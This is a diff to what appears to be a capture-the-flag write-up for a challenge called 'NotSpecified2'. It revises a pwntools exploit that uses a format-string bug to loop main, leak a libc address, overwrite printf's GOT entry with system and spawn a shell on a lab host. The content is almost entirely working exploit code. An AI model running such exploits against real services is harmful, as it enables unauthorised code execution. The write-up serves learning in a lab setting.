@@ -129,7 +129,8 @@ The steps will be:
 
 1. Use format string bug to overwrite exit to main's address, causing main to loop
 2. On second loop, leak a libc address, so we can calculate where libc is (its PIE)
-3. On the third loop, overwrite exit with system and win
+3. On the third loop, overwrite printf with system.
+4. On the fourth and final loop, put the address of /bin/sh into the buffer - it will spawn a shell when 'printf' is called
 
 the below code will do this (WIP):
 
@@ -140,37 +141,41 @@ elf = context.binary = ELF("./NotSpecified2/notspecified2")
 libc = ELF("./NotSpecified2/libc.so.6")
 ld = ELF("./NotSpecified2/ld-linux-x86-64.so.2")
 
-exit_got = elf.got.exit
-main_addr = elf.sym.main
-
-p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
-# p = remote('10.10.87.64', 5000)
-p.clean()
+# p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
+p = remote('10.10.241.248', 5000)
+p.recvuntil(b"Please provide your username:\x0a")
 
 # offset found with p.sendline(b'AAAAAAAA %6$p')
 offset = 6
 
 # make main loop by changing the final exit to the start of main
-payload = fmtstr_payload(6, {exit_got : main_addr})
+payload = fmtstr_payload(6, {elf.got.exit : elf.sym.main})
 p.sendline(payload)
 
-interim = p.clean()
+p.recvuntil(b"Please provide your username:\x0a")
 
 # on second loop leak printf address to calculate libc base
 payload = b"%7$s||||" + p64(elf.got.puts)
 p.sendline(payload)
 
-result = p.clean()
+result = p.recvuntil(b"Please provide your username:\x0a")
+
 puts_address = u64(result[7:13].ljust(8, b'\x00'))
 libc.address = puts_address - libc.sym.puts
+print(libc.address)
 
-interim = p.clean()
-
-# set exit to system on third loop
-payload = fmtstr_payload(6, {exit_got : libc.sym.system})
-
-p.interactive()
-
+# set printf to system on third loop
+payload = fmtstr_payload(6, {elf.got.printf : libc.sym.system})
 p.sendline(payload)
+
+p.recvuntil(b"Please provide your username:\x0a")
+
+# spawn shell on fourth loop (printf will now be system)
+# strings -a -t x libc.so.6 | grep /bin/sh
+payload = p64(libc.address + 0x1d8698)
+p.sendline(payload)
+
 p.interactive()
 ```
+
+Note main is still looping, so the output is a bit mangled. But the shell works.
